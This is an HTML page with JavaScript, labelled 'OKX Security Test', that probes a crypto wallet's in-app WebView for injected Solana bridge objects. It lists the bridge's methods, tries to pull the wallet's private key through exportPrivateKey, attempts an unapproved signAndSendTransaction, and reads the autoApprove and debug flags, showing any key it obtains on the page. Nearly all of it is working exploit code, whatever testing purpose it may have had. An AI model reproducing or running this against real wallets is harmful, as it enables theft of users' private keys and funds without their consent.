<html>
<head><meta charset="UTF-8">
<style>
body{background:#1a1a2e;color:#eee;font-family:monospace;padding:20px}
.green{color:#0f0}.red{color:#e94560}.yellow{color:#ffa500}.info{color:#8899aa}
#log{background:#16213e;padding:15px;border-radius:8px;line-height:1.8;font-size:14px}
</style></head>
<body>
<h2>OKX Security Test</h2>
<div id="status">Initializing...</div>
<div id="log"></div>
<script>
(function(){
    var el = document.getElementById('log');
    var st = document.getElementById('status');
    function log(cls, msg) { el.innerHTML += '<span class="'+cls+'">'+msg+'</span><br>'; }

    // 先用 try/catch 包住全部，防止任何 JS 错误使页面空白
    try {
        // Step 1: 检查桥是否存在
        var bridgeReady = (typeof solanaBridge !== 'undefined');
        var solanaReady = (typeof window.solana !== 'undefined');
        var svmReady = (typeof window.svm !== 'undefined');

        log('info', 'Bridge check: solanaBridge=' + bridgeReady + ' solana=' + solanaReady + ' svm=' + svmReady);

        st.innerHTML = 'Bridge: ' + (bridgeReady ? '✅' : '❌') + ' solana: ' + (solanaReady ? '✅' : '❌') + ' svm: ' + (svmReady ? '✅' : '❌');

        // Step 2: 如果有 solanaBridge，枚举所有方法
        if(bridgeReady) {
            st.innerHTML = '✅ solanaBridge available! Testing methods...';
            log('green', '[+] solanaBridge methods:');

            // 枚举可调用的方法
            var methods = [];
            for(var m in solanaBridge) {
                if(typeof solanaBridge[m] === 'function') methods.push(m);
            }
            log('info', '    ' + methods.join(', '));

            // Step 3: 尝试 exportPrivateKey - 同步方式
            log('info', '[>] Trying exportPrivateKey (sync)...');
            try {
                var keyResult = solanaBridge.exportPrivateKey("");
                log('green', '[!!!] SYNC RESULT: ' + JSON.stringify(keyResult));
            } catch(e) {
                log('red', '[-] sync error: ' + e.message);
            }

            // Step 4: 尝试 exportPrivateKey - 异步方式
            log('info', '[>] Trying exportPrivateKey (async)...');
            solanaBridge.exportPrivateKey("").then(function(key) {
                log('green', '[!!!] ASYNC KEY: ' + key);
                st.innerHTML = '✅✅✅ PRIVATE KEY: ' + key;
                st.style.fontSize = '18px';
            }).catch(function(e) {
                log('red', '[-] async error: ' + e.message);
                st.innerHTML = '⚠️ Bridge works but exportPrivateKey failed: ' + e.message;
            });

            // Step 5: 尝试 signAndSendTransaction
            log('info', '[>] Trying signAndSendTransaction...');
            solanaBridge.signAndSendTransaction(JSON.stringify({to:'0xTest',amount:'0.001',token:'SOL'})).then(function(tx) {
                log('green', '[!!!] TX: ' + JSON.stringify(tx));
            }).catch(function(e) {
                log('red', '[-] signAndSend error: ' + e.message);
            });
        }

        // Step 6: window.solana 信息
        if(solanaReady) {
            log('green', '[+] window.solana.autoApprove: ' + window.solana.autoApprove);
            log('green', '[+] window.solana.isDebug: ' + window.solana.isDebug);
        }
        if(svmReady) {
            log('green', '[+] window.svm.autoApprove: ' + window.svm.autoApprove);
        }

        if(!bridgeReady && !solanaReady && !svmReady) {
            st.innerHTML = '❌ No bridges found. Wrong WebView context.';
            st.style.color = '#e94560';
        }

    } catch(e) {
        log('red', '[FATAL] ' + e.message);
        st.innerHTML = '❌ Script error: ' + e.message;
    }
})();
</script>
</body></html>
